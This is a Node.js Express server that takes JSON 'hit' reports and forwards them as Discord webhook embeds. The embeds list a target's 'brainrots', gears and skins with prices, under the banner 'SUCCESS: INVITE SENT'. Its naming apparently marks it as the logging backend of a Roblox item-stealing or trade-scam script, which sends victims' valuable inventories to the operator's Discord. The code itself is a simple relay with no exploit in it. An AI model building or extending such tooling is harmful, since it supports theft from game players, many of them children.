require('dotenv').config();
const express = require('express');
const axios = require('axios');

const app = express();
app.use(express.json());

// Middleware de seguridad
app.use((req, res, next) => {
  const authHeader = req.headers.authorization;
  if (process.env.API_KEY && authHeader !== `Bearer ${process.env.API_KEY}`) {
    return res.status(401).json({ error: 'No autorizado' });
  }
  next();
});

app.post('/transform', async (req, res) => {
  try {
    const data = req.body;
    const embed = buildHitEmbed(data);
    await axios.post(process.env.DISCORD_WEBHOOK_URL, { embeds: [embed] });
    res.json({ status: 'ok', message: 'Mensaje enviado a Discord' });
  } catch (error) {
    console.error(error);
    res.status(500).json({ error: 'Error al procesar la solicitud' });
  }
});

function buildHitEmbed(data) {
  const scriptName = process.env.SCRIPT_NAME || 'Script';
  const executor = data.executor || 'Desconocido';
  const target = data.target || {};
  const targetedBrainrots = data.targetedBrainrots || [];
  const untargetedBrainrots = data.untargetedBrainrots || [];
  const baseSkins = data.baseSkins || [];
  const gears = data.gears || [];
  const timestamp = data.timestamp || '';

  const targetedList = targetedBrainrots.map(item => `• ${item.displayName} — $${item.price}/s`).join('\n') || 'Ninguno';
  const untargetedList = untargetedBrainrots.map(item => `• 🧠 ${item.displayName} — $${item.price}/s`).join('\n') || 'Ninguno';

  // Base skins y gears juntos como "Targeted Gears & Base Skins"
  const gearsAndSkins = [];
  baseSkins.forEach(skin => gearsAndSkins.push(`• 👕 ${skin}`));
  gears.forEach(gear => gearsAndSkins.push(`• ⚙️ ${gear}`));
  const gearsSkinsList = gearsAndSkins.join('\n') || 'Ninguno';

  const totalTargeted = targetedBrainrots.length + baseSkins.length + gears.length;
  const totalUntargeted = untargetedBrainrots.length;

  const description = [
    `✨ Invite successfully sent to Username: **${executor}**`,
    `Inventory scan complete. Processing items...`
  ].join('\n');

  return {
    title: `✅ SUCCESS: ${scriptName} INVITE SENT`,
    description: description,
    color: 0x2ecc71, // verde éxito
    fields: [
      {
        name: `🧠 Targeted Brainrots (${targetedBrainrots.length}):`,
        value: targetedList || 'Ninguno',
        inline: false
      },
      {
        name: `⚙️ Targeted Gears & Base Skins (${baseSkins.length + gears.length}):`,
        value: gearsSkinsList || 'Ninguno',
        inline: false
      },
      {
        name: `❌ Untargeted Items (${totalUntargeted}):`,
        value: untargetedList || 'Ninguno',
        inline: false
      }
    ],
    footer: {
      text: `${scriptName} | Automated System • ${timestamp}`
    },
    timestamp: new Date().toISOString()
  };
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`API escuchando en puerto ${PORT}`));
